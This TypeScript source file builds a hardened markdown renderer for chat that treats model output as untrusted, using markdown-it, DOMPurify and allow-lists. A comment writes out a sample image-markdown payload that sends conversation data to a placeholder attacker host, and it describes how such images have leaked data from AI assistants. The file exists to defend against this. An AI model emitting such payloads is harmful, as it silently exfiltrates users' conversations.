import DOMPurify from 'dompurify';
/**
 * markdown-it 15 SHIPS ITS OWN TYPES and the default export is a value, not a type: the `.d.mts`
 * ends with `… MarkdownItCallable as default`, so the default import binds a VALUE whose instance
 * type is a separate named type-only export of the same name. Hence the alias rather than a shadow —
 * annotating with the default binding is `TS2749: 'MarkdownIt' refers to a value`.
 *
 * `@types/markdown-it` IS NO LONGER A DEPENDENCY OF THIS APP, and that is now measured rather than
 * asserted. Under `moduleResolution: bundler` TypeScript takes the package's own
 * `exports['.'].types`; `tsc --traceResolution` resolves this specifier to
 * `markdown-it/dist/markdown-it.d.mts@15.0.0` and never consults DefinitelyTyped, so the v14 stubs
 * were dead weight against a v15 runtime — exactly as `apps/widget/src/render/renderer.ts` flagged
 * and declined to act on, it being a manifest and lockfile change rather than a type fix. Removed
 * here; `apps/widget` still carries it and is not this scope's to edit.
 */
import MarkdownIt, { type MarkdownIt as MarkdownItInstance, type RendererRule, type Token } from 'markdown-it';

/**
 * MODEL OUTPUT AND SOURCE TEXT ARE UNTRUSTED DATA. markdown-it (`html: false`) → DOMPurify (ARRAY
 * config, `RETURN_DOM_FRAGMENT`) → `replaceChildren`. Nothing here is ever assigned to `innerHTML`.
 *
 * ── THIS IS THE SECOND COPY OF THIS RENDERER, AND THAT IS A KNOWN DEFECT ─────────────────────────
 * The first is `apps/widget/src/render/renderer.ts`, whose own docblock states the rule: "the rule
 * is not 'keep the copies in sync', it is 'a second one must not appear', and the control is a
 * reviewer." Hosted chat needs a renderer and there is currently nowhere shared to put one:
 *
 *   - `packages/contracts`' ROOT entry is budgeted at <=1 kB brotli inside the widget's 30 kB app
 *     shell, and markdown-it plus DOMPurify is roughly sixty times that.
 *   - a THIRD workspace package is explicitly a finding rather than a refactor.
 *   - `apps/web` cannot import from `apps/widget`.
 *
 * THE FIX, and it is a small one somebody should take: a `@kb/contracts/render` SUBPATH, exactly as
 * `@kb/contracts/forms` already does for Zod (ADR-028) — markdown-it and dompurify as OPTIONAL peer
 * dependencies, `external` in tsup, so the widget's root-entry budget is untouched by construction
 * rather than by tree-shaking luck. Both apps already depend on both libraries at the same pinned
 * versions, so it costs no new dependency. It is not done here because it changes a package two
 * other apps consume and the widget's migration cannot be tested from this scope.
 *
 * UNTIL THEN: the CONFIGURATION below is byte-identical to the widget's and must stay that way.
 * "One renderer everywhere" is a rule about configuration — one call site with a looser
 * `ALLOWED_ATTR` forks it just as completely as a second copy of the code.
 */

const md: MarkdownItInstance = new MarkdownIt({
  // THE PRIMARY CONTROL, and markdown-it's own default: "Don't enable HTML… Output will be safe
  // without sanitizer." It also blocks javascript:, vbscript:, file: and all data: except
  // gif/png/jpeg/webp via validateLink.
  html: false,
  // linkify turns bare text into anchors, which is one more way for model output to produce a
  // clickable destination we did not choose.
  linkify: false,
  breaks: true,
});

/**
 * NEVER AUTO-LOAD A MODEL-EMITTED IMAGE.
 *
 * `![](https://attacker/?d=<conversation>)` is a zero-click GET to an attacker-chosen URL with
 * attacker-chosen query parameters. Nothing about it is XSS — a correct sanitizer passes it, because
 * it is a valid non-scripting <img>. Demonstrated against the Azure OpenAI Playground in 2023;
 * recurred as EchoLeak, CVE-2025-32711, CVSS 9.3, in Microsoft 365 Copilot.
 *
 * Three independent layers: this rule, `img` excluded from ALLOWED_TAGS, and `img-src` in the CSP.
 */
const blockImage: RendererRule = (tokens, idx) => {
  // eslint-disable-next-line security/detect-object-injection -- array index from markdown-it, typed number
  const token: Token | undefined = tokens[idx];
  const alt = token === undefined ? '' : md.utils.escapeHtml(token.content);
  return `<span class="md-image-blocked" data-alt="${alt}">[image]</span>`;
};

md.renderer.rules['image'] = blockImage;

/**
 * External links: `noopener` stops reverse tabnabbing through `window.opener` (the implicit browser
 * behaviour does not cover `window.open()` or older embedded webviews). `noreferrer` is an
 * EXFILTRATION control — without it a model-emitted link leaks this page's URL, and with it the bot
 * id, to the destination in the `Referer`.
 *
 * ── REGISTERED LAZILY, NOT AT MODULE SCOPE, AND THAT IS A NEXT.JS CONSTRAINT ─────────────────────
 * DOMPurify's ESM default export is only a configured instance where there is a DOM; in Node it is
 * a FACTORY, so `DOMPurify.addHook` is not a function. The widget never meets this because it is
 * browser-only — but Next EVALUATES `'use client'` MODULES ON THE SERVER during SSR, so a
 * module-scope call here is a hard 500 on the hosted chat page, at import time, before anything
 * renders. Measured: `TypeError: …purify.es.mjs.default.addHook is not a function`.
 *
 * Registering from inside `renderMarkdown` — which only ever runs from an effect, and therefore only
 * in a browser — keeps the "registered once" property that matters. A hook must never MUTATE CONFIG:
 * `setConfig()` and a config-mutating hook permanently pollute `ALLOWED_ATTR` for every later call.
 */
let hookRegistered = false;

function ensureLinkHook(): void {
  if (hookRegistered) return;
  hookRegistered = true;
  DOMPurify.addHook('afterSanitizeAttributes', (node) => {
    if (node instanceof Element && node.tagName === 'A' && node.hasAttribute('href')) {
      node.setAttribute('target', '_blank');
      node.setAttribute('rel', 'noopener noreferrer nofollow ugc');
    }
  });
}

export function renderMarkdown(container: Element, markdown: string): void {
  ensureLinkHook();

  const fragment = DOMPurify.sanitize(md.render(markdown), {
    ALLOWED_TAGS: [
      'p', 'br', 'strong', 'em', 'del', 'code', 'pre', 'blockquote', 'ul', 'ol', 'li', 'a',
      'h1', 'h2', 'h3', 'h4', 'table', 'thead', 'tbody', 'tr', 'th', 'td', 'hr', 'span',
    ],
    // PLAIN ARRAYS ONLY. The function/predicate forms of ADD_TAGS/ADD_ATTR bypass FORBID_TAGS
    // through a short-circuit asymmetry and SKIP URI VALIDATION ENTIRELY (CVE-2026-65912).
    ALLOWED_ATTR: ['href', 'title', 'class'],
    // A SCHEME ALLOW-LIST, never a block-list. Blocking javascript:/data:/vbscript: misses blob:,
    // filesystem:, about:, custom protocol handlers, and every case/whitespace/entity variant.
    ALLOWED_URI_REGEXP: /^https?:\/\//i,
    ALLOW_DATA_ATTR: false,
    // mXSS: a string safe as parsed becomes unsafe when re-serialized and re-parsed, because HTML
    // serialization is not the inverse of parsing at foreign-content boundaries. Never re-serialize,
    // and never IN_PLACE.
    RETURN_DOM_FRAGMENT: true,
  });

  // `replaceChildren`, not innerHTML. The node goes in as a node.
  container.replaceChildren(fragment);
}
